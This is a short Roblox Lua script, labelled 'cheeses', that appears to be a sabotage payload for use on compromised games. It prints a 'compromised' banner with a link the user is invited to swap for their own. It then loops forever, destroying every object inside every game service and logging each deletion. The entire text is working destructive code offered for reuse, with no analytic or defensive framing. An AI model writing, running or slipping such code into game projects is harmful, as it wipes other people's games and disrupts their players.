-- "cheeses"
print("compromised. for more info visit https://compromisedbysomeoneimportant.straw.page/") -- replace this website with yours if you want to
while true do
	for i,t in pairs(game:GetChildren()) do
		for i,x in pairs(t:GetChildren()) do
			x:Destroy()
			print("deleted " .. x.Name .. " out of " .. t.Name)
		end
	end
end
